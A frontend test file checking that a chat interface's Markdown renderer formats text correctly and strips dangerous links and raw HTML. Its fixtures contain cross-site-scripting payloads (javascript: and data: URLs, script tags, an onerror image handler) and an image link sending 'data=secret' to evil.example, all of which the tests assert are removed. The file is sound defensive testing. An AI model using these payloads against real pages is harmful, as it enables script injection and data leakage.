import { render, screen, within } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import type { Message } from '../types/api'
import { Markdown, safeUrl } from './Markdown'
import { MessageList } from './MessageList'

function renderMarkdown(text: string) {
  return render(<Markdown text={text} />).container
}

describe('Markdown', () => {
  it('renders headings, emphasis, lists, code and tables', () => {
    const container = renderMarkdown(
      [
        '## Recommendation',
        '',
        'Use **Cloud Foundry** with _autoscaling_.',
        '',
        '- one',
        '- two',
        '',
        '1. first',
        '',
        'Run `cf push` now.',
        '',
        '```yaml',
        'applications:',
        '  - name: api',
        '```',
        '',
        '| Runtime | Use |',
        '|---|---|',
        '| CF | apps |',
      ].join('\n'),
    )
    expect(screen.getByRole('heading', { level: 2, name: 'Recommendation' })).toBeInTheDocument()
    expect(container.querySelector('strong')).toHaveTextContent('Cloud Foundry')
    expect(container.querySelector('em')).toHaveTextContent('autoscaling')
    expect(container.querySelectorAll('ul > li')).toHaveLength(2)
    expect(container.querySelectorAll('ol > li')).toHaveLength(1)
    expect(container.querySelector('p code')).toHaveTextContent('cf push')
    expect(container.querySelector('pre code')?.textContent).toBe('applications:\n  - name: api\n')
    const table = screen.getByRole('table')
    expect(within(table).getByRole('columnheader', { name: 'Runtime' })).toBeInTheDocument()
    expect(within(table).getByRole('cell', { name: 'apps' })).toBeInTheDocument()
  })

  it('opens safe links in a new tab without opener access', () => {
    renderMarkdown('See [the docs](https://help.sap.com/btp).')
    const link = screen.getByRole('link', { name: 'the docs' })
    expect(link).toHaveAttribute('href', 'https://help.sap.com/btp')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow')
  })

  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    '/api/v1/auth/logout',
  ])('drops unsafe or relative link target %s', (url) => {
    const container = renderMarkdown(`[click me](${url})`)
    expect(screen.queryByRole('link')).not.toBeInTheDocument()
    expect(container).toHaveTextContent('click me')
    expect(container.innerHTML).not.toMatch(/javascript:|vbscript:|data:/i)
  })

  it('never renders raw HTML or loads images', () => {
    const container = renderMarkdown(
      [
        '<script>window.hacked = true</script>',
        '<img src=x onerror="window.hacked = true">',
        '<a href="javascript:alert(1)">html link</a>',
        '<iframe src="https://evil.example"></iframe>',
        '![tracking pixel](https://evil.example/leak?data=secret)',
        'Plain text survives.',
      ].join('\n\n'),
    )
    for (const tag of ['script', 'img', 'iframe', 'a']) expect(container.querySelector(tag)).toBeNull()
    expect(container.innerHTML).not.toMatch(/onerror|evil\.example|javascript:/)
    expect(container).toHaveTextContent('[tracking pixel]')
    expect(container).toHaveTextContent('Plain text survives.')
    expect((window as unknown as { hacked?: boolean }).hacked).toBeUndefined()
  })

  it('keeps single line breaks inside a paragraph', () => {
    const container = renderMarkdown('line one\nline two')
    expect(container.querySelector('p')?.textContent).toBe('line one\nline two')
  })

  it('allows only absolute http(s) and mailto URLs', () => {
    expect(safeUrl('https://example.com/a', 'href', {} as never)).toBe('https://example.com/a')
    expect(safeUrl('mailto:ops@example.com', 'href', {} as never)).toBe('mailto:ops@example.com')
    expect(safeUrl('javascript:alert(1)', 'href', {} as never)).toBeNull()
    expect(safeUrl('#top', 'href', {} as never)).toBeNull()
  })
})

describe('MessageList rendering', () => {
  const base = { conversation_id: 'c1', client_message_id: null, created_at: '2026-11-01T10:00:00Z' }
  const messages: Message[] = [
    { ...base, id: 'u1', role: 'user', content: '**not bold** <b>tag</b>' },
    { ...base, id: 'a1', role: 'assistant', content: '**bold** answer\n\n— Source: test source.' },
  ]

  it('renders assistant Markdown but shows user text literally', () => {
    render(<MessageList messages={messages} hasMore={false} loadingOlder={false} onLoadOlder={() => undefined} />)
    const [user, assistant] = screen.getAllByRole('listitem')
    expect(user.querySelector('strong, b')).toBeNull()
    expect(user).toHaveTextContent('**not bold** <b>tag</b>')
    expect(assistant.querySelector('strong')).toHaveTextContent('bold')
    expect(within(assistant).getByText('Source: test source.')).toHaveClass('message__source')
  })
})
